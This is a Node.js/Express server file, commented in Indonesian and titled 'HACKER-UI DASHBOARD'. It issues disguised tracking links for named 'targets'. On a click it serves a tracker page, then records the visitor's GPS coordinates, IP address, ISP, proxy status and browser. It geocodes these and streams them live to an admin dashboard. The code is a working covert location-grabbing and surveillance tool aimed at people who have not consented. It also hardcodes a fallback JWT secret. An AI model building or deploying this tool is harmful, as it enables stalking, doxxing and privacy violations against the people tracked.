// File: server.js (v4.2 - Real-time Data on Login)

require('dotenv').config();

const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const UAParser = require('ua-parser-js');
const { nanoid } = require('nanoid');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const db = require('./db');
const requestIp = require('request-ip');
const axios = require('axios');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });
const PORT = process.env.PORT || 3000;

const JWT_SECRET = process.env.JWT_SECRET || 'gantidengankatayangsan6atrahas14';

// ================== MIDDLEWARE ================== //
app.use(cors());
app.use(express.json());
app.use(requestIp.mw());
app.use(express.static(__dirname));

// ================== MIDDLEWARE PROTEKSI RUTE ================== //
const protectRoute = (req, res, next) => {
    try {
        const token = req.headers.authorization?.split(" ")[1];
        if (!token) {
            return res.status(401).json({ message: 'Akses ditolak. Token tidak ada.' });
        }
        
        jwt.verify(token, JWT_SECRET, (err, decoded) => {
            if (err) {
                 return res.status(401).json({ message: 'Token tidak valid.' });
            }
            req.user = decoded;
            next();
        });
    } catch (error) {
        res.status(401).json({ message: 'Token tidak valid atau error.' });
    }
};

// ================== HELPER FUNCTIONS & SOCKET.IO ================== //

// [START] FUNGSI DIPERBARUI
// Fungsi ini sekarang bisa mengirim ke semua orang (io.emit) atau ke satu soket spesifik (socket.emit)
const broadcastDashboardUpdate = async (socket = null) => {
    try {
        const [links] = await db.promise().query(`
            SELECT 
                l.id, l.original_url, l.created_at, l.expires_at, 
                u.username, l.click_count, l.last_clicked_at,
                last_loc.city, last_loc.country
            FROM links l JOIN users u ON l.user_id = u.id
            LEFT JOIN (
                SELECT tracker_id, city, country, ROW_NUMBER() OVER (PARTITION BY tracker_id ORDER BY created_at DESC) as rn
                FROM locations
            ) AS last_loc ON l.id = last_loc.tracker_id AND last_loc.rn = 1
            ORDER BY l.created_at DESC
        `);
        const [stats] = await db.promise().query(`
            SELECT 
                (SELECT COUNT(*) FROM links) as total_links,
                (SELECT SUM(click_count) FROM links) as total_clicks,
                (SELECT COUNT(*) FROM locations) as total_locations
        `);
        const [locations] = await db.promise().query(`SELECT user_agent FROM locations`);
        const parser = new UAParser();
        const browserStats = locations.reduce((acc, loc) => {
            if (loc.user_agent) {
                const browserName = parser.setUA(loc.user_agent).getBrowser().name || "Unknown";
                acc[browserName] = (acc[browserName] || 0) + 1;
            }
            return acc;
        }, {});

        const data = { links, stats: stats[0], browserStats };

        // Tentukan target emit: satu soket spesifik atau semua koneksi
        const emitter = socket || io;
        emitter.emit('dashboard_update', data);

    } catch (error) {
        console.error("❌ Gagal broadcast update:", error);
    }
};
// [END] FUNGSI DIPERBARUI

const broadcastLogMessage = (message) => {
    const timestamp = new Date().toLocaleTimeString('id-ID');
    io.emit('new_log_message', `[${timestamp}] ${message}`);
};

// [START] KONEKSI SOCKET DIPERBARUI
io.on('connection', (socket) => {
    console.log('🔌 Klien baru terhubung via WebSocket');

    // Tambahkan listener untuk event permintaan data awal
    socket.on('request_initial_data', (payload) => {
        try {
            const token = payload.token;
            if (!token) return; // Abaikan jika tidak ada token

            // Verifikasi token yang dikirim oleh klien
            jwt.verify(token, JWT_SECRET, (err, decoded) => {
                if (err) {
                    console.log('🔒 Token tidak valid dari klien soket.');
                    return; // Token tidak valid, jangan kirim data
                }
                
                // Token valid, kirim data awal HANYA ke klien ini
                console.log(`✅ Klien terotentikasi (${decoded.username}), mengirim data awal.`);
                broadcastDashboardUpdate(socket);
            });
        } catch (error) {
            console.error('Error pada event request_initial_data:', error);
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Klien terputus');
    });
});
// [END] KONEKSI SOCKET DIPERBARUI


// ================== RUTE PUBLIK (LOGIN & HALAMAN UTAMA) ================== //
app.get('/', (req, res) => {
    res.redirect('/login.html');
});

app.post('/login', async (req, res) => {
    // ... (Fungsi login tidak berubah)
    const { username, password } = req.body;
    try {
        const [users] = await db.promise().query('SELECT * FROM users WHERE username = ? AND is_admin = TRUE', [username]);
        if (users.length === 0) {
            return res.status(401).json({ message: 'Username atau password salah.' });
        }
        const admin = users[0];
        const isMatch = await bcrypt.compare(password, admin.password);
        if (!isMatch) {
            return res.status(401).json({ message: 'Username atau password salah.' });
        }
        const token = jwt.sign({ userId: admin.id, username: admin.username }, JWT_SECRET, { expiresIn: '8h' });
        res.json({ message: 'Login berhasil!', token });
    } catch (error) {
        console.error("Error saat login:", error);
        res.status(500).json({ message: 'Server error' });
    }
});


// ================== RUTE LINK KLIK & LOG (TETAP PUBLIK) ================== //
app.get('/:id', async (req, res) => {
    // ... (Fungsi ini tidak berubah)
    const { id } = req.params;
    try {
        const [links] = await db.promise().query(`SELECT l.original_url, l.expires_at, u.username FROM links l JOIN users u ON l.user_id = u.id WHERE l.id = ?`, [id]);
        if (links.length === 0) return res.status(404).send('<h1>404 Not Found</h1>');
        const { original_url, expires_at, username } = links[0];
        if (expires_at && new Date(expires_at) < new Date()) return res.status(410).send('<h1>Link has expired.</h1>');
        await db.promise().query("UPDATE links SET click_count = click_count + 1, last_clicked_at = NOW() WHERE id = ?", [id]);
        broadcastLogMessage(`> Link [${id}] clicked by target [${username}]`);
        io.emit('link_clicked', { username: username, id: id });
        fs.readFile(path.join(__dirname, 'tracker.html'), 'utf8', (fsErr, data) => {
            if (fsErr) return res.status(500).send('Server error');
            res.send(data.replace('{{DESTINATION_URL}}', original_url).replace('{{TRACKER_ID}}', id).replace('{{USERNAME}}', username));
        });
    } catch (error) {
        console.error("Error handling link click:", error);
        res.status(500).send('Server error');
    }
});

app.post('/log', async (req, res) => {
    // ... (Fungsi ini tidak berubah, tetapi pemanggilan broadcastDashboardUpdate sekarang mengirim ke semua)
    const { latitude, longitude, trackerId, username } = req.body;
    const userAgentString = req.headers['user-agent'];
    const ipAddress = req.clientIp;
    try {
        const [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
        if (users.length === 0) return res.status(404).json({ status: 'error', message: 'User not found' });
        let country = null, city = null, isp = null, org = null, proxy = false;
        try {
            const apiKey = process.env.OPENCAGE_API_KEY;
            if (apiKey) {
                const geoUrl = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=${apiKey}&language=id&pretty=1`;
                const geoResponse = await axios.get(geoUrl);
                const components = geoResponse.data.results[0]?.components;
                if (components) {
                    country = components.country;
                    city = components.city || components.town || components.village || components.state_district;
                }
            }
            const ipUrl = `http://ip-api.com/json/${ipAddress}?fields=status,message,isp,org,proxy`;
            const ipResponse = await axios.get(ipUrl);
            if (ipResponse.data.status === 'success') {
                isp = ipResponse.data.isp;
                org = ipResponse.data.org;
                proxy = ipResponse.data.proxy;
            }
        } catch (apiError) {
            console.error("❌ Gagal memanggil API eksternal:", apiError.message);
        }
        const newLocation = { user_id: users[0].id, tracker_id: trackerId, latitude, longitude, ip_address: ipAddress, user_agent: userAgentString, country, city, isp, org, proxy };
        await db.promise().query('INSERT INTO locations SET ?', newLocation);
        const parser = new UAParser(userAgentString);
        const ua = parser.getResult();
        const browserInfo = ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown';
        const osInfo = ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown';
        const locationInfo = city ? `from ${city}, ${country}` : '';
        broadcastLogMessage(`> Location ${locationInfo} from [${username}] | ${browserInfo} on ${osInfo} | IP: ${ipAddress}`);
        console.log(`📍 Lokasi diterima dari: ${username} [${ipAddress}] - ${city || 'Unknown City'}, ${country || 'Unknown Country'}`);
        broadcastDashboardUpdate(); // Panggil tanpa argumen untuk mengirim ke semua klien
        const newLocationDataForMap = { ...newLocation, username };
        io.emit('new_location_logged', newLocationDataForMap);
        res.json({ status: 'success' });
    } catch (error) {
        console.error("Error logging location:", error);
        res.status(500).json({ status: 'error' });
    }
});


// ================== API YANG DIPROTEKSI ================== //
app.post('/create', protectRoute, async (req, res) => {
    // ... (Fungsi ini tidak berubah)
    const { username, originalUrl, expiresIn } = req.body;
    if (!username || !originalUrl) return res.status(400).json({ error: 'Data tidak lengkap' });
    let expiresAt = null;
    if (expiresIn && !isNaN(parseInt(expiresIn))) {
        expiresAt = new Date();
        expiresAt.setHours(expiresAt.getHours() + parseInt(expiresIn));
    }
    try {
        let [users] = await db.promise().query('SELECT id FROM users WHERE username = ?', [username]);
        let userId;
        if (users.length > 0) {
            userId = users[0].id;
        } else {
            const [result] = await db.promise().query('INSERT INTO users (username) VALUES (?)', [username]);
            userId = result.insertId;
        }
        const id = nanoid(8);
        await db.promise().query('INSERT INTO links SET ?', { id, user_id: userId, original_url: originalUrl, expires_at: expiresAt });
        broadcastLogMessage(`> Link created for target [${username}] with ID [${id}]`);
        broadcastDashboardUpdate();
        res.status(201).json({ newLink: `http://localhost:${PORT}/${id}`, username });
    } catch (error) {
        console.error("Error creating link:", error);
        res.status(500).json({ error: 'DB error' });
    }
});

app.delete('/api/links/:id', protectRoute, async (req, res) => {
    // ... (Fungsi ini tidak berubah)
    const { id } = req.params;
    try {
        await db.promise().query("DELETE FROM links WHERE id = ?", [id]);
        broadcastLogMessage(`> Link [${id}] has been deleted.`);
        broadcastDashboardUpdate();
        res.json({ status: 'success', message: 'Link berhasil dihapus.' });
    } catch (error) {
        res.status(500).json({ status: 'error', message: 'Gagal menghapus link.' });
    }
});

app.get('/api/locations', protectRoute, async (req, res) => {
    // ... (Fungsi ini tidak berubah)
    try {
        const [rows] = await db.promise().query(`
            SELECT l.*, u.username
            FROM locations l 
            JOIN users u ON l.user_id = u.id 
            ORDER BY l.created_at DESC
        `);
        res.json(rows);
    } catch (err) {
        res.status(500).json({ error: 'Database error' });
    }
});

app.get('/api/locations/:trackerId', protectRoute, async (req, res) => {
    // ... (Fungsi ini tidak berubah)
    const { trackerId } = req.params;
    try {
        const [locations] = await db.promise().query(`
            SELECT latitude, longitude, created_at, ip_address, user_agent, country, city, isp, org, proxy 
            FROM locations WHERE tracker_id = ? ORDER BY created_at DESC`, [trackerId]);
        const parser = new UAParser();
        const parsedLocations = locations.map(loc => {
            const ua = parser.setUA(loc.user_agent).getResult();
            return { ...loc, browser: ua.browser.name ? `${ua.browser.name} ${ua.browser.version || ''}`.trim() : 'Unknown', os: ua.os.name ? `${ua.os.name} ${ua.os.version || ''}`.trim() : 'Unknown', device: { type: ua.device.type || 'desktop', vendor: ua.device.vendor || 'Unknown', model: ua.device.model || 'N/A' } };
        });
        res.json(parsedLocations);
    } catch (error) {
        res.status(500).json({ error: 'DB error' });
    }
});

// ================== RUN SERVER ================== //
server.listen(PORT, () => {
    console.log(`\n HACKER-UI DASHBOARD v4.2 (Real-time on Login)`);
    console.log(`===================================================`);
    console.log(`✅ Server berjalan di http://localhost:${PORT}\n`);
});